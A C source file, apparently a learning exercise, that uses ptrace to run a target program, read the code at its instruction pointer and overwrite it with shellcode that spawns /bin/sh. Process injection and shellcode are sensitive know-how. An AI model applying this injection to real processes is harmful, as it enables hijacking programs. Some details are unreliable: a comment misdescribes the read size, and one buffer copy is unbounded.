#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/reg.h>   /* For constants  ORIG_RAX etc */
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <string.h>
#include <stdlib.h>
#include <linux/limits.h>

void read_argument(pid_t child, char *reg)
{
    char *child_addr;
    int i;
  
    //读取RIP寄存器的值，是一个地址
    child_addr = (char *)ptrace(PTRACE_PEEKUSER, child, 8*RIP, NULL);
 
    do {
        long val;
        char *p;
  	//每次只读取一个字节
        val = ptrace(PTRACE_PEEKTEXT, child, child_addr, NULL);
        if (val == -1) {
        	return;
	}
        child_addr += sizeof (long);
  
        p = (char *) &val;
        for (i = 0; i < sizeof (long); ++i, ++reg) {
            *reg = *p++;
            if (*reg == '\0') break;
        }
    } while (i == sizeof (long));
}
   
void put_argument(pid_t child,char *com){

	char *reg_addr,*com_addr;
	reg_addr = (char*)ptrace(PTRACE_PEEKUSER,child,8*RIP,0);

	do{
		int i;
		char val[sizeof(long)];
		for(i=0;i<sizeof(long);++i,++com){
			val[i] = *com;
			if(*com == '\0') break;
		}
		ptrace(PTRACE_POKETEXT,child,reg_addr,*(long *)val);
		reg_addr+=sizeof(long);
	}while(*com);

	
}
int main(int argc,char *argv[])
{
    pid_t child;
    struct user_regs_struct regs;

    char *shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

    char test[25];
    char data[25];
    if(argc !=2){
    	 printf("Usage: %s <ELF to be traced>\n", 
               argv[0]);
	 exit(1);
    }
    child = fork();
    if(child == 0)
    {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
	execl(argv[1], NULL);
    }
    else
    {
    	wait(NULL);    
	printf("Start to ptrace ...\n");

	ptrace(PTRACE_GETREGS,child,NULL,&regs);

	read_argument(child,data);

	put_argument(child,shellcode);

        ptrace(PTRACE_DETACH,child,NULL,NULL);
    }
    return 0;
}
